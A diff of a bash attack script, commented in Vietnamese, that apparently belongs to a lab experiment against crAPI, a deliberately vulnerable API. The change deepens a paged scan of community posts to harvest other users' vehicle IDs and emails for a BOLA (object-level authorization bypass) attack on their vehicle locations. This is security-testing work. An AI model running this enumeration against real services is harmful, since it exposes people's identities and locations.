@@ -37,27 +37,65 @@ log "vehicle của testuser01: ${own_uuid:-<none>}"
 # crAPI: (1) lộ vehicleid của người khác qua community/posts (trường author.vehicleid), (2) đọc
 # vehicle/{id}/location của họ. Chỉ tính là BOLA khi trả 200 VÀ email chủ xe ≠ kẻ tấn công.
 ATTACKER_EMAIL="testuser01@ztlab.local"
+VICTIMS="${VP_VICTIMS:-${VICTIMS:-0}}"
+
+# §B5 mục 1 (2026-10-13): khúc 1 của đợt 150h cho thấy quét cố định (31 trang ×
+# 30 = 930 bài) KHÔNG đủ qua nhiều giờ — N1/N2/campaign đăng bài liên tục suốt
+# khúc, "recent" bị pha loãng theo thời gian chạy (không phải theo số bài cố
+# định), nên pool tụt dưới VICTIMS=10 dù đã seed 15 nạn nhân (§B1f). Khả năng
+# phát hiện suy giảm THEO THỜI GIAN CHẠY — càng về cuối 150h sẽ càng tệ, các
+# variant victims=8,10 sẽ gần như không chạy được nếu không sửa.
+#
+# SỬA: quét SÂU HƠN, LUỸ TIẾN theo trang cho tới khi thu đủ VICTIMS vehicleid
+# PHÂN BIỆT, có giới hạn số trang để không quét vô hạn nếu seed thật sự thiếu.
+# KHÔNG đọc vehicleid từ file cache ghi lúc seed — làm vậy bỏ qua chuỗi phát
+# hiện thật (community/posts → vehicleid) và quay lại đúng lỗi H18 đã sửa
+# trước đây; "CRS = 0 trên BOLA" chỉ có nghĩa khi cuộc tấn công đi đúng chuỗi.
+BOLA_SCAN_PAGE_SIZE="${BOLA_SCAN_PAGE_SIZE:-30}"
+BOLA_SCAN_MAX_PAGES="${BOLA_SCAN_MAX_PAGES:-200}"   # trần 200×30=6000 bài — đủ cho cả khúc dài nhiều giờ
+declare -A _seen_map=()
+off=0; pages=0; last_batch_n=-1
+while :; do
+  resp="$(curl -s -A "$BROWSER_UA" "${_tls_opts[@]}" -b "$J" --max-time 20 \
+    "$BFF_URL/community/api/v2/community/posts/recent?limit=$BOLA_SCAN_PAGE_SIZE&offset=$off")"
+  pages=$((pages + 1))
+  last_batch_n=0
+  # sentinel "__N__\t<n>" đi qua CHUNG một pipe với vid/email — tránh đua tiến
+  # trình giữa process substitution và việc đọc file stderr riêng (đã gặp: đọc
+  # file trước khi python flush/đóng, luôn thấy 0, vòng quét dừng sau trang 1).
+  while IFS=$'\t' read -r tag rest; do
+    if [[ "$tag" == "__N__" ]]; then
+      last_batch_n="$rest"
+    elif [[ -n "$tag" ]]; then
+      _seen_map["$tag"]="$rest"
+    fi
+  done < <(printf '%s' "$resp" | python3 -c 'import json,sys
+try: d=json.load(sys.stdin)
+except Exception: sys.exit()
+posts=d.get("posts",[])
+print(f"__N__\t{len(posts)}")
+for p in posts:
+    a=p.get("author") or {}
+    if a.get("vehicleid") and a.get("email")!=sys.argv[1]:
+        vid=a["vehicleid"]; em=a["email"]
+        print(f"{vid}\t{em}")' "$ATTACKER_EMAIL")
+  distinct=${#_seen_map[@]}
+  off=$((off + BOLA_SCAN_PAGE_SIZE))
+  # dừng khi: đã đủ nạn nhân yêu cầu, HOẶC trang trả về rỗng (hết dữ liệu thật),
+  # HOẶC chạm trần số trang (an toàn, không quét vô hạn).
+  if [[ "$VICTIMS" -gt 0 && "$distinct" -ge "$VICTIMS" ]]; then break; fi
+  if [[ "${last_batch_n:-0}" -le 0 ]]; then break; fi
+  if [[ "$pages" -ge "$BOLA_SCAN_MAX_PAGES" ]]; then break; fi
+done
 declare -a TARGETS=()
-mapfile -t TARGETS < <(for off in 0 30 60 90 120 150 180 210 240 270; do
-    curl -s -A "$BROWSER_UA" "${_tls_opts[@]}" -b "$J" --max-time 20 \
-      "$BFF_URL/community/api/v2/community/posts/recent?limit=30&offset=$off"; echo; done \
-  | python3 -c 'import json,sys
-seen={}
-for l in sys.stdin:
-    try: d=json.loads(l)
-    except Exception: continue
-    for p in d.get("posts",[]):
-        a=p.get("author") or {}
-        if a.get("vehicleid") and a.get("email")!=sys.argv[1]: seen[a["vehicleid"]]=a["email"]
-print("\n".join(seen))' "$ATTACKER_EMAIL")
-log "vehicleid của người khác lộ qua community/posts: ${#TARGETS[@]} (${TARGETS[*]})"
+mapfile -t TARGETS < <(printf '%s\n' "${!_seen_map[@]}")
+log "vehicleid của người khác lộ qua community/posts: ${#TARGETS[@]} (quét $pages trang × $BOLA_SCAN_PAGE_SIZE) (${TARGETS[*]})"
 [[ ${#TARGETS[@]} -ge 1 ]] || fail "không tìm thấy vehicleid nào của người khác qua community/posts — seed thiếu dữ liệu nạn nhân"
 
 # §B1: THỰC THI số nạn nhân. VICTIMS=n → chạm đúng n thực thể KHÁC NHAU (không chỉ
 # ghi nhãn). §B1b: LUÂN PHIÊN — xáo trộn POOL nạn nhân (toàn bộ vehicleid lộ ra)
 # rồi RÚT ngẫu nhiên VICTIMS cái; khác nhau giữa các lượt, không cố định. Danh
 # sách đã dùng ghi vào runs.jsonl (qua CRAPI_RUN_META) để kiểm rò rỉ danh tính sau.
-VICTIMS="${VP_VICTIMS:-${VICTIMS:-0}}"
 POOL_SIZE=${#TARGETS[@]}
 mapfile -t TARGETS < <(printf '%s\n' "${TARGETS[@]}" | shuf)   # luân phiên
 if [[ "$VICTIMS" -gt 0 ]]; then
